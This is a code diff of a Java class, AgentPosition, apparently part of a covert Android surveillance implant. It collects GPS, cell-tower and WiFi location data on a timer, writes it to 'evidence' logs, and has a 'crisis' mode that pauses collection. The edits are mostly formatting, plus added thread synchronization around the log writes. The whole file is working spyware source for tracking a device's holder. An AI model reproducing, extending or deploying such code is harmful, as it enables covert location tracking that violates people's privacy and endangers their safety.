@@ -35,7 +35,7 @@ import com.android.service.util.DataBuffer;
 import com.android.service.util.DateTime;
 import com.android.service.util.Utils;
 
-public class AgentPosition extends AgentBase implements IncrementalLog,LocationListener {
+public class AgentPosition extends AgentBase implements IncrementalLog, LocationListener {
 	private static final String TAG = "AgentPosition"; //$NON-NLS-1$
 	private static final int TYPE_GPS = 1;
 	private static final int TYPE_CELL = 2;
@@ -57,7 +57,6 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 	int period;
 
 	LogR logIncrGPS, logIncrCell;
-	
 
 	@Override
 	public void begin() {
@@ -67,7 +66,7 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 		}
 
 		if (cellEnabled) {
-			logIncrCell=factoryCellLog();
+			logIncrCell = factoryCellLog();
 		}
 
 		locator = new GPSLocatorPeriod(this, period);
@@ -76,11 +75,11 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 	}
 
 	private LogR factoryCellLog() {
-		LogR logCell=null;
+		LogR logCell = null;
 		final CellInfo info = Device.getCellInfo();
 		if (!info.valid) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + "invalid cell info") ;//$NON-NLS-1$ //$NON-NLS-2$
+				Check.log(TAG + " Error: " + "invalid cell info");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			return null;
 		}
@@ -91,7 +90,7 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 			logCell = new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0, LOG_TYPE_CDMA));
 
 		}
-		
+
 		return logCell;
 	}
 
@@ -102,7 +101,7 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 			locator.join();
 		} catch (final InterruptedException e) {
 			if (Cfg.DEBUG) {
-				Check.log(e) ;//$NON-NLS-1$
+				Check.log(e);//$NON-NLS-1$
 			}
 		}
 		locator = null;
@@ -129,7 +128,7 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 			} else {
 
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " Warn: " + "GPS Disabled at compile time") ;//$NON-NLS-1$ //$NON-NLS-2$
+					Check.log(TAG + " Warn: " + "GPS Disabled at compile time");//$NON-NLS-1$ //$NON-NLS-2$
 				}
 
 			}
@@ -144,19 +143,19 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 			}
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: " + "Type: " + type) ;//$NON-NLS-1$ //$NON-NLS-2$
+				Check.log(TAG + " Info: " + "Type: " + type);//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: " + "Period: " + period) ;//$NON-NLS-1$ //$NON-NLS-2$
+				Check.log(TAG + " Info: " + "Period: " + period);//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: " + "gpsEnabled: " + gpsEnabled) ;//$NON-NLS-1$ //$NON-NLS-2$
+				Check.log(TAG + " Info: " + "gpsEnabled: " + gpsEnabled);//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: " + "cellEnabled: " + cellEnabled) ;//$NON-NLS-1$ //$NON-NLS-2$
+				Check.log(TAG + " Info: " + "cellEnabled: " + cellEnabled);//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: " + "wifiEnabled: " + wifiEnabled) ;//$NON-NLS-1$ //$NON-NLS-2$
+				Check.log(TAG + " Info: " + "wifiEnabled: " + wifiEnabled);//$NON-NLS-1$ //$NON-NLS-2$
 			}
 
 			setPeriod(period);
@@ -165,7 +164,7 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 		} catch (final IOException e) {
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + e.toString()) ;//$NON-NLS-1$
+				Check.log(TAG + " Error: " + e.toString());//$NON-NLS-1$
 			}
 
 			return false;
@@ -179,30 +178,30 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 
 		if (Status.self().crisisPosition()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Warn: " + "Crisis!") ;//$NON-NLS-1$ //$NON-NLS-2$
+				Check.log(TAG + " Warn: " + "Crisis!");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			return;
 		}
 
 		if (gpsEnabled) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " actualRun: gps") ;//$NON-NLS-1$
+				Check.log(TAG + " actualRun: gps");//$NON-NLS-1$
 			}
 
 			locationGPS();
 		}
-		
+
 		if (cellEnabled) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " actualRun: cell") ;//$NON-NLS-1$
+				Check.log(TAG + " actualRun: cell");//$NON-NLS-1$
 			}
 
 			locationCELL();
 		}
-		
+
 		if (wifiEnabled) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " actualRun: wifi") ;//$NON-NLS-1$
+				Check.log(TAG + " actualRun: wifi");//$NON-NLS-1$
 			}
 
 			locationWIFI();
@@ -217,12 +216,14 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 		if (wifi != null && wifi.getBSSID() != null) {
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: " + "Wifi: " + wifi.getBSSID()) ;//$NON-NLS-1$ //$NON-NLS-2$
+				Check.log(TAG + " Info: " + "Wifi: " + wifi.getBSSID());//$NON-NLS-1$ //$NON-NLS-2$
 			}
 
 			final byte[] payload = getWifiPayload(wifi.getBSSID(), wifi.getSSID(), wifi.getRssi());
 
-			new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(1, LOG_TYPE_WIFI), payload);
+			synchronized (this) {
+				new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(1, LOG_TYPE_WIFI), payload);
+			}
 
 			// logWifi.createEvidence(getAdditionalData(1, LOG_TYPE_WIFI),
 			// EvidenceType.LOCATION_NEW);
@@ -231,7 +232,7 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 		} else {
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Warn: " + "Wifi disabled") ;//$NON-NLS-1$ //$NON-NLS-2$
+				Check.log(TAG + " Warn: " + "Wifi disabled");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 
 		}
@@ -247,7 +248,7 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 		final CellInfo info = Device.getCellInfo();
 		if (!info.valid) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + "invalid cell info") ;//$NON-NLS-1$ //$NON-NLS-2$
+				Check.log(TAG + " Error: " + "invalid cell info");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			return;
 		}
@@ -255,11 +256,15 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 		byte[] payload = null;
 		if (info.gsm) {
 			payload = getCellPayload(info, LOG_TYPE_GSM);
-			logIncrCell.write(payload);
+			synchronized (this) {
+				logIncrCell.write(payload);
+			}
 
 		} else if (info.cdma) {
 			payload = getCellPayload(info, LOG_TYPE_CDMA);
-			logIncrCell.write(payload);
+			synchronized (this) {
+				logIncrCell.write(payload);
+			}
 		}
 
 	}
@@ -267,21 +272,21 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 	private void locationGPS() {
 		if (locator == null) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + "GPS Not Supported on Device") ;//$NON-NLS-1$ //$NON-NLS-2$
+				Check.log(TAG + " Error: " + "GPS Not Supported on Device");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			return;
 		}
 
 		if (lastLocation == null) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " waitingForPoint") ;//$NON-NLS-1$
+				Check.log(TAG + " waitingForPoint");//$NON-NLS-1$
 			}
 
 			return;
 		}
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " newLocation") ;//$NON-NLS-1$
+			Check.log(TAG + " newLocation");//$NON-NLS-1$
 		}
 
 		byte[] payload;
@@ -289,7 +294,7 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 			final long timestamp = lastLocation.getTime();
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " valid") ;//$NON-NLS-1$
+				Check.log(TAG + " valid");//$NON-NLS-1$
 			}
 
 			payload = getGPSPayload(lastLocation, timestamp);
@@ -299,7 +304,9 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 		// new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
 		// getAdditionalData(0, LOG_TYPE_GPS), payload);
 
-		logIncrGPS.write(payload);
+		synchronized (this) {
+			logIncrGPS.write(payload);
+		}
 
 		/*
 		 * Evidence logGPS = new Evidence(EvidenceType.LOCATION_NEW);
@@ -317,7 +324,7 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 			final double lat = location.getLatitude();
 			final double lng = location.getLongitude();
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " lat: " + lat + " lon:" + lng) ;//$NON-NLS-1$ //$NON-NLS-2$
+				Check.log(TAG + " lat: " + lat + " lon:" + lng);//$NON-NLS-1$ //$NON-NLS-2$
 			}
 		}
 		synchronized (this) {
@@ -366,7 +373,7 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 		}
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " saveEvidence payload: " + payload.length) ;//$NON-NLS-1$
+			Check.log(TAG + " saveEvidence payload: " + payload.length);//$NON-NLS-1$
 		}
 
 		final int version = 2008121901;
@@ -403,7 +410,7 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 
 	private byte[] getWifiPayload(String bssid, String ssid, int signalLevel) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " getWifiPayload bssid: " + bssid + " ssid: " + ssid + " signal:" + signalLevel) ;//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+			Check.log(TAG + " getWifiPayload bssid: " + bssid + " ssid: " + ssid + " signal:" + signalLevel);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 		}
 		final int size = 48;
 		final byte[] payload = new byte[size];
@@ -436,7 +443,7 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 		}
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " getWifiPayload ssidcontent.length: " + ssidcontent.length) ;//$NON-NLS-1$
+			Check.log(TAG + " getWifiPayload ssidcontent.length: " + ssidcontent.length);//$NON-NLS-1$
 		}
 
 		databuffer.writeInt(ssidcontent.length);
@@ -508,7 +515,7 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 	private byte[] getGPSPayload(Location loc, long timestamp) {
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " getGPSPayload") ;//$NON-NLS-1$
+			Check.log(TAG + " getGPSPayload");//$NON-NLS-1$
 		}
 
 		final Date date = new Date(timestamp);
@@ -522,7 +529,7 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 		final float course = loc.getBearing();
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " " + " " + speed + "|" + latitude + "|" + longitude + "|" + course + "|" + date) ;//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$
+			Check.log(TAG + " " + " " + speed + "|" + latitude + "|" + longitude + "|" + course + "|" + date);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$
 		}
 
 		final DateTime dateTime = new DateTime(date);
@@ -579,7 +586,7 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 		databuffer.write(new byte[48]); // sn view
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " len: " + databuffer.getPosition()) ;//$NON-NLS-1$
+			Check.log(TAG + " len: " + databuffer.getPosition());//$NON-NLS-1$
 		}
 
 		if (Cfg.DEBUG) {
@@ -590,10 +597,13 @@ public class AgentPosition extends AgentBase implements IncrementalLog,LocationL
 
 	}
 
-	public void resetLog() {
+	public synchronized void resetLog() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (resetLog)");
+		}
 		if (logIncrCell != null && logIncrCell.hasData()) {
 			logIncrCell.close();
-			logIncrCell = logIncrCell=factoryCellLog();
+			logIncrCell = logIncrCell = factoryCellLog();
 		}
 
 		if (logIncrGPS != null && logIncrGPS.hasData()) {
